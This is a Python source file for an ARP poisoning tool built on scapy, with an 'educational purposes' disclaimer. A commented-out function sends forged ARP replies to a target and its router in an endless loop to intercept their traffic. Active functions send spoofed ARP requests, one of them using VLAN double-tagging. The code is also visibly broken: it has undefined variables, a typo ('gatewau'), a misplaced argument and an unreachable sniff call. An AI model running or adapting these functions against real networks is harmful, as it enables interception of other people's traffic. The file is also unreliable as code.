""" Created by Samuel Quarm. Use ethically 
DISCLAIMER:
This tool is provided for educational and research purposes only.
Unauthorized use on networks you do not own or have explicit permission to test
may violate the law. The author is not responsible for misuse.
"""
#----------------------------------------------------------------------------------------------------------------------------------------------------------
#Imports
from scapy.all import *
import ipaddress, socket, time
from rich.console import Console
from rich.table import Table
from rich.live import Live
import time
import pyfiglet
from termcolor import colored
import netifaces
import ipaddress
from identifiers.mac import get_mac, get_my_mac


#variables in the rich library


console = Console()
#----------------------------------------------------------------------------------------------------------------------------------------------------------

#ARP Poisoning Function for Target Only
""" def arp_poison(target_ip, router_ip, router_mac, target_mac, source_mac):

    #automatically inserted target mac variabke
    
    target_mac = get_mac(target_ip)
    if not target_mac:
        console.print(f"[red] Could not resolve MAC for {target_ip}")
        return 

    source_mac = get_my_mac()
    if not source_mac:
        console.print(f"[red] Could not resolve MAC for host")
        return



    #fake mac variable (not important)
    # fake_mac = "00:11:22:33:44:55"  
    hwsrc = source_mac
    #ARP Broadcast Packet
    packet_for_target = Ether(dst=router_mac, src=hwsrc) / ARP(op=2, psrc=target_ip, hwsrc=source_mac, hwdst=router_mac, pdst=router_ip)
    packet_for_router = Ether(dst=target_mac,src=hwsrc) / ARP(op=2, psrc=router_ip, hwsrc=source_mac, hwdst=target_mac, pdst=target_ip)
    iface = conf.iface

    console.print(f"[yellow]Poisoning {target_ip} and {router_ip}...")
    try:
        while True:
            sendp(packet_for_target, iface=iface, verbose=0, count=1)  
            sendp(packet_for_router, iface=iface, verbose=0, count=1)
            time.sleep(2)


            console.print("[green]...\n")
            console.print("[blue]ARP Poisoning completed. Press Ctrl+C to stop.")
    except Exception as e:
        console.print("[red]Failed to Send Poisoning Packets. Please Try Again. \n") """
    # scapy poison packet insertions under layer2 protocol 
def arp_cache_poison():
    sendp(Ether(dst=clientMAC)/ARP(op="who-has", psrc=gateway, pdst=client),
        inter=RandNum(10,40), loop=1)

def arp_vlan_poison():
    sendp(Ether(dst=clientMAC)/Dot1Q(vlan=1)/Dot1Q(vlan=2)
        /ARP(op="who-has", psrc=gatewau, pdst=client,
        inter=RandNum(10,40)))


def arp_monitor_callback(pkt):
    if ARP in pkt and pkt[ARP].op in (1,2):
        return pkt.sprintf("%ARP.hwsrc% %ARP.psrc%")

    sniff(prn=arp_monitor_callback, filter="arp", store=0)
#----------------------------------------------------------------------------------------------------------------------------------------------------------

